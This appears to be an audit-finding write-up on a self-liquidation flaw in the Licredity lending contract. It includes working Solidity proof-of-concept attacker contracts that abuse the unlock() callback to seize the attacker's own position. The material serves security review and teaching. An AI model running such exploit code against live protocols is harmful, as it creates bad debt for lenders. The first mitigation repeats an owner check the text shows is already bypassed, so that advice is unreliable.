# Self-Liquidation via Unlock Abuse in Licredity

* **Severity**: Critical
* **Source**: [Cyfrin Audit Report](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-09-01-cyfrin-licredity-v2.0.md#proxy-based-self-liquidation-creates-bad-debt-for-lenders)
* **Affected Contract**: [Licredity.sol](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol)
* **Vulnerability Type**: Logic Flaw / Liquidation Abuse / Ownership Constraint Bypass

## Summary

Licredity allows users to open borrowing positions and enforces that **unhealthy positions can be seized (liquidated) by others**.
The intent is that **owners cannot liquidate their own positions**, since that would let them deliberately under-collateralize themselves and profit from liquidation mechanics.

However, due to how the `unlock()` flow and callback system works, an attacker can:

1. Open a position.
2. Temporarily make it unhealthy inside an `unlockCallback`.
3. Use a separate helper contract to call `seize()` against their **own position**, making it "healthy" again.

This creates a **self-liquidation loophole** that lets position owners manipulate system incentives in ways the protocol design explicitly forbids.

## A Better Explanation (With Simplified Example)

### Intended Behavior

* Alice opens a position with **10 ETH collateral** and borrows **5,000 USDC**.
* If ETH price drops, her position may become unhealthy.
* A third-party liquidator can then **seize the position**, repaying debt and taking collateral.
* Alice herself **cannot** liquidate her own loan.

### What Actually Happens (Bug)

* The `unlock()` function lets arbitrary contracts implement `IUnlockCallback`.
* Inside that callback, **the position owner can:**

  1. Borrow more to deliberately make their position unhealthy.
  2. Immediately call `seize()` from a helper contract they control.
* Because seizure happens in the same atomic `unlock()` call, the position flips back to "healthy" before final checks run.

Result: **The owner liquidates their own position**, bypassing intended restrictions.

### Why This Matters

* Owners can engineer **risk-free liquidation flows** that were never meant to exist.
* This may let them:

  * Capture liquidation bonuses for themselves.
  * Exploit incentive mechanisms (e.g. seize collateral at unfair valuations).
  * Undermine trust in liquidation markets.

### Concrete Walkthrough (Alice & Mallory)

* **Setup**: Alice has 10 ETH collateral, 0 debt.
* **Step 1**: Alice calls `unlock()` via her own crafted `AttackerRouter`.
* **Step 2**: Inside `unlockCallback`:

  * She borrows 1 ETH worth of debt, making the position unhealthy.
* **Step 3**: Still inside the callback, she calls `seizer.seize(positionId)`.

  * Even though she is the owner, the call succeeds because seizure happens before `unlock()` finishes.
* **Step 4**: Control returns to `unlock()`, which checks positions are healthy.

  * The position is now "healthy," so the check passes.

Result: **Alice just seized her own position**, which should never be allowed.

> **Analogy**: Imagine a casino forbids you from betting on your own hand as the dealer. But if you temporarily swap seats mid-round and then swap back before the pit boss checks, the system sees everything as valid, even though you profited from self-play.

## Vulnerable Code References

### Callback in `unlock()` (enables attacker control window)

```solidity
// Licredity.unlock(...)
result = IUnlockCallback(msg.sender).unlockCallback(data);
// ... final health checks happen only after callback returns ...
```

### Seize owner check (insufficient by itself)

```solidity
// in seize()
if (position.owner == msg.sender) {
    revert CannotSeizeOwnPosition();
}
```

This check is bypassable because attacker calls `seize` via an intermediate contract; `msg.sender` becomes that intermediate (non-owner) contract.

## Concrete PoC (test + attacker contracts)

Below are compact PoC snippets (same as in the reproduced test) that demonstrate the exact exploit. Comments explain each step.

### Test (high level)

```solidity
function test_seize_ownPosition_using_external_contract() public {
    // 1) Prepare environment: create a big position so protocol has liquidity (test setup)
    uint256 positionId = licredityRouter.open();
    token.mint(address(this), 10 ether);
    token.approve(address(licredityRouter), 10 ether);
    licredityRouter.depositFungible(positionId, Fungible.wrap(address(token)), 10 ether);

    // add debt to have lenders/totalDebt state set up (helper)
    uint128 borrowAmount = 9 ether;
    (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
    uint256 delta = borrowAmount.toShares(totalAssets, totalShares);
    licredityRouterHelper.addDebt(positionId, delta, address(1));

    // 2) Attacker deploys helper contracts
    AttackerSeizer seizer = new AttackerSeizer(licredity);
    AttackerRouter attackerRouter = new AttackerRouter(licredity, token, seizer);

    // 3) Attack: single call that opens a new position, borrows inside the unlock callback,
    //    and uses external seizer to call seize() (msg.sender != position.owner)
    attackerRouter.depositFungible(0.5 ether);
}
```

### AttackerSeizer (minimal seizer contract)

```solidity
contract AttackerSeizer {
    Licredity public licredity;

    constructor(Licredity _licredity) {
        licredity = _licredity;
    }

    // simply forwards to Licredity.seize; msg.sender inside Licredity becomes AttackerSeizer
    function seize(uint256 positionId) external {
        licredity.seize(positionId, msg.sender);
    }
}
```

### AttackerRouter (position owner + unlock callback)

```solidity
contract AttackerRouter {
    Licredity public licredity;
    BaseERC20Mock public token;
    AttackerSeizer public seizer;

    constructor(Licredity _licredity, BaseERC20Mock _token, AttackerSeizer _seizer) {
        licredity = _licredity;
        token = _token;
        seizer = _seizer;
    }

    // Entry point used in the test. Opens a position, deposits collateral,
    // then calls unlock(data) which triggers unlockCallback() below.
    function depositFungible(uint256 amount) external {
        uint256 positionId = licredity.open();

        licredity.stageFungible(Fungible.wrap(address(token)));
        token.mint(address(licredity), amount);
        licredity.depositFungible(positionId);

        // critical: this will call AttackerRouter.unlockCallback(positionId) inside Licredity.unlock(...)
        licredity.unlock(abi.encode(positionId));
    }

    // This runs inside Licredity.unlock() as a callback.
    // Attack steps:
    // 1) increaseDebtShare -> borrow (makes position temporarily unhealthy)
    // 2) call AttackerSeizer.seize(positionId) -> calls Licredity.seize with msg.sender = AttackerSeizer
    function unlockCallback(bytes calldata data) public returns (bytes memory) {
        uint256 positionId = abi.decode(data, (uint256));

        // borrow a small amount (increase debt) — this can make position unhealthy
        uint128 borrowAmount = 1 ether;
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        uint256 delta = borrowAmount.toShares(totalAssets, totalShares);
        licredity.increaseDebtShare(positionId, delta, address(this));

        // perform the seizure through a separate contract so message sender != position.owner
        seizer.seize(positionId);

        return new bytes(0);
    }
}
```

**Why this works:** `increaseDebtShare` temporarily makes the position unhealthy inside the `unlock` callback. Calling `seizer.seize(...)` executes `Licredity.seize` with `msg.sender == AttackerSeizer` (not the position owner), so the `position.owner == msg.sender` guard does not stop it. The final `unlock()` health checks run after the callback, but the bad position was already seized/removed — so everything passes.

## Recommended Mitigation

1. **Forbid self-seizure explicitly**

   ```solidity
   require(position.owner != msg.sender, "Cannot seize own position");
   ```

2. **Constrain seizure ordering**

   * Require that `seize()` must be the **first action** inside an `unlock()` execution.
   * Use the `Locker.isRegistered()` check to revert if the position has already been touched in the same call.

   ```solidity
   if (Locker.isRegistered(bytes32(positionId))) {
       revert CannotSeizeRegisteredPosition();
   }
   ```

3. **Mirror proven design patterns**

   * Euler's **EVault Kit** uses a similar guard: if a position has already been modified in this transaction, liquidation cannot be performed atomically.

## Pattern Recognition Notes

* **Atomic "Create/Borrow/Liquidate" Exploit**: Letting a user open, destabilize, and liquidate their own loan in a single transaction breaks the intended liquidation model.
* **Callback Abuse**: If protocols let external contracts execute callbacks, attackers can reorder state changes within a transaction.
* **Ownership Constraint Bypass**: Explicit checks like `owner != msg.sender` must be enforced consistently, including across delegate/indirect flows.
* **Locker Tracking Pattern**: Use per-transaction "touched state" flags to ensure actions like liquidation only occur in valid orderings.

### Quick Recall (TL;DR)

* **Bug**: Position owners can borrow, make themselves unhealthy, and self-liquidate in the same `unlock()`.
* **Impact**: Self-liquidation → capture liquidation incentives unfairly.
* **Fix**: Forbid `seize()` on the same position if it has already been modified in the same unlock cycle; enforce `owner != msg.sender`.
